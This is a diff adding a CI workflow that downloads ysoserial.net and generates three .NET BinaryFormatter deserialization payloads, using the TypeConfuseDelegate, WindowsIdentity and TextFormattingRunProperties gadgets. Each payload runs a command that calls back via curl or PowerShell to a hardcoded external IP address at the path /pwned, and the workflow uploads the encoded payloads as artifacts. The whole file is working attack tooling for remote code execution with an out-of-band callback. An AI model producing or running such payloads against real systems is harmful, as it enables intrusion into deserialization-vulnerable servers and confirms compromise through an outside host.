@@ -1,0 +1,35 @@
+name: Generate OOB callback payload
+on: [push]
+jobs:
+  generate:
+    runs-on: windows-latest
+    steps:
+      - name: Download ysoserial.net
+        run: |
+          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
+          Invoke-WebRequest $url -OutFile ysoserial.zip
+          Expand-Archive ysoserial.zip -DestinationPath yso
+      - name: Generate OOB payloads
+        run: |
+          $exe = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
+          $ip = "167.172.142.69"
+          $port = "8080"
+
+          & $exe.FullName -g TypeConfuseDelegate -f BinaryFormatter `
+            -c "cmd /c curl http://${ip}:${port}/pwned" `
+            -o base64 | Out-File payload_oob_tcd.b64 -Encoding ascii
+
+          & $exe.FullName -g WindowsIdentity -f BinaryFormatter `
+            -c "cmd /c powershell -c `"Invoke-WebRequest http://${ip}:${port}/pwned -UseBasicParsing`"" `
+            -o base64 | Out-File payload_oob_wid.b64 -Encoding ascii
+
+          & $exe.FullName -g TextFormattingRunProperties -f BinaryFormatter `
+            -c "cmd /c curl http://${ip}:${port}/pwned" `
+            -o base64 | Out-File payload_oob_tfrp.b64 -Encoding ascii
+
+          Write-Host "Done"
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: oob-payloads
+          path: "*.b64"
